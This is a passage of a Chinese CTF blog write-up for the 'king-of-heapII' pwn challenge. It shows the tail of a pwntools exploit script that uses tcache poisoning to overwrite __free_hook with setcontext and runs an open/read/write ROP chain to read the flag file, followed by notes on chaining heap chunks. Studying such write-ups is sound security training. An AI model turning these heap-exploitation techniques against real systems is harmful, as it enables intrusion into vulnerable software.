<span class="comment">#: pop rdx ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x43ae8</span> + libc_base <span class="comment">#: pop rax ; ret</span></span><br><span class="line"><span class="comment">#syscall = 0x13c0 + libc_base #: syscall</span></span><br><span class="line">syscall = <span class="number">0xd2745</span> + libc_base <span class="comment">#: syscall ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再把前面为了拿出这些堆块地址而存入tcache的堆块拿出</span></span><br><span class="line"><span class="comment"># 防止后面申请的堆块与这些堆块重复，这些堆块是为了存flag和ROP链用的。</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare for writing payload</span></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">start_payload = p64(pop_rdi)</span><br><span class="line"><span class="comment"># must before write payload, because it will break the frame of heap when </span></span><br><span class="line"><span class="comment"># writing payload.</span></span><br><span class="line"><span class="comment"># in order to change rdi + 0xa0 and rdi + 0xa8 &#x27;s content, where </span></span><br><span class="line"><span class="comment"># rdi is supposed to be chunk7&#x27;s addr (exclude chunk head)</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x40</span>) </span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x30</span> + p64(fake_stack_addr1) + start_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain except first gadget（i.e., start_payload）</span></span><br><span class="line">payload = p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#payload += p64(pop_rdx) + p64(0)</span></span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"><span class="comment">#payload += p64(pop_rdi) + p64(fake_stack_addr2)</span></span><br><span class="line"><span class="comment">#payload += p64(set_context)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(flag_addr + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdx) + p64(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload2 = p64(0x20)</span></span><br><span class="line">payload2 = p64(pop_rax) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line"><span class="comment">#payload2 += p64(pop_rdi) + p64(fake_stack_addr3)</span></span><br><span class="line"><span class="comment">#payload2 += p64(set_context)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#payload3 += p64(pop_rsi) + p64(flag_addr + 8)</span></span><br><span class="line"><span class="comment">#payload3 += p64(pop_rdx) + p64(0x20)</span></span><br><span class="line">payload2 += p64(pop_rax) + p64(<span class="number">1</span>)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># get two continus chunk</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fake_stack_addr2 - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">edit(<span class="number">6</span>,payload2)</span><br><span class="line"><span class="comment"># this operation will make top chunk frame break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit free_hook </span></span><br><span class="line"><span class="comment"># (is not related to top chunk (only tcache), so it will not go wrong)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(set_context))</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-注意事项"><a href="#0x06-注意事项" class="headerlink" title="0x06 注意事项"></a>0x06 注意事项</h2><p>1、首先要注意，修改free_hook的操作会破坏tcache中0x70这个链表的内容，会导致最后这个链表不能正确的放出堆块。</p>
+<p>2、然后要注意的是，ROP链的大小大于0x60，所以不能在一个chunk中写完，但刚好可以在两个堆块中写完。所以这里我们需要做两个堆块的连接。也就是把第二个堆块分配的位置往低地址-0x10。</p>
+<p>例如（如下图）：在tcache中，其结构为tcache-&gt;1-&gt;2，则修改1的fd为0x555620，这样分配出来可用的字段就是0x555630开始，这样之后，往chunk1中写0x60个字节刚好写到了0x555630这里，chunk2又可以从这个地方接着往后写0x60个字节，这样就使得chunk1的内容和chunk2的内容连起来了。</p>
+<p>并且这样操作之后也会让top chunk识别出错，即不能再从top chunk中分配出堆块了，但不会影响到tcache的使用。</p>
+<p><img src="/2021/09/28/king-of-heap2-orw-glibc-2.27/king-of-heap2-orw-glibc-2.27%5Cimage-20210928165154363.png" alt="image-20210928165154363"></p>
+<p>3、这个题堆块一开始有很多零碎的分配，都在tcache中，因此需要先搞一个循环把这些堆块都分配出来，这样才能使得后面分配的堆块是从top chunk中分配出来的，且为连续的。</p>
+<p>4、直接<code>ROPgadget --binary ./libc.so</code> 是没法找到<code>syscall ; ret</code>的。必须要使用<code>ROPgadget --binary ./libc.so --multibr</code> 才行。</p>
+<h2 id="0x-最后一段用于查找md源文件以便修改"><a href="#0x-最后一段用于查找md源文件以便修改" class="headerlink" title="0x?? 最后一段用于查找md源文件以便修改"></a>0x?? 最后一段用于查找md源文件以便修改</h2><blockquote>
+<p>//文档查找：king-of-heap2-orw-glibc-2.27.md</p>
+</blockquote>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2021/09/28/king-of-heap2-orw-glibc-2.27/">长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw</a></p>
+        <p><span>文章作者:</span><a href="/" title="请访问 HaveYouTall 的个人博客">HaveYouTall</a></p>
+        <p><span>发布时间:</span>2021年09月28日 - 15时35分</p>
+        <p><span>最后更新:</span>2021年09月28日 - 19时06分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/28/king-of-heap2-orw-glibc-2.27/" title="长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw">https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://haveyoutall.github.io/2021/09/28/king-of-heap2-orw-glibc-2.27/　　作者: HaveYouTall" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/28/gdb-parameters-for-main/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">main函数参数传递的几点记录</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-number">1.</span> <span class="toc-text">0x00 前情提要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%AE%80%E8%A6%81%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x01 简要的程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Leak-Libc"><span class="toc-number">3.</span> <span class="toc-text">0x02 Leak Libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">4.</span> <span class="toc-text">0x03 栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9E%84%E6%80%9DROP"><span class="toc-number">5.</span> <span class="toc-text">0x04 构思ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-EXP"><span class="toc-number">6.</span> <span class="toc-text">0x05 EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">7.</span> <span class="toc-text">0x06 注意事项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-%E6%9C%80%E5%90%8E%E4%B8%80%E6%AE%B5%E7%94%A8%E4%BA%8E%E6%9F%A5%E6%89%BEmd%E6%BA%90%E6%96%87%E4%BB%B6%E4%BB%A5%E4%BE%BF%E4%BF%AE%E6%94%B9"><span class="toc-number">8.</span> <span class="toc-text">0x?? 最后一段用于查找md源文件以便修改</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'luuman',
+      repo: 'luuman.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2021/09/28/gdb-parameters-for-main/" title="下一篇: main函数参数传递的几点记录">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/28/king-of-heap2-orw-glibc-2.27/">长城杯pwn-king-of-heapII-writeup---记录第一次heap上的orw</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/28/gdb-parameters-for-main/">main函数参数传递的几点记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/23/gnuradio/">Ubuntu 18.04 gnuradio安装踩坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/05/ciscn_2019_ne_5-wp/">ciscn_2019_ne_5的wp，走了歪路的一个栈溢出（错的地方还是不知道为啥）</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/01/ciscn_2019_c_1-wp/">ciscn_2019_c_1 pwn题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/30/login-wp/">Login-未知出处的CTF入门题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/11/ubuntu16-pwntools/">ubuntu16-pwntools-安装问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/11/ubuntu16-ruby/">ubuntu16-ruby-安装问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/11/%E5%A4%8D%E6%97%A6%E7%99%BD%E6%B3%BD%E6%9A%91%E6%9C%9F%E8%AF%BE%E7%A8%8B-heap-%E9%A2%98-%E7%AC%AC%E4%B8%80%E9%A2%98/">复旦白泽暑期课程 heap 题 第一题</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/30/hello-world/">hexo博客搭建问题记录</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2021 HaveYouTall
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 28;
+            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
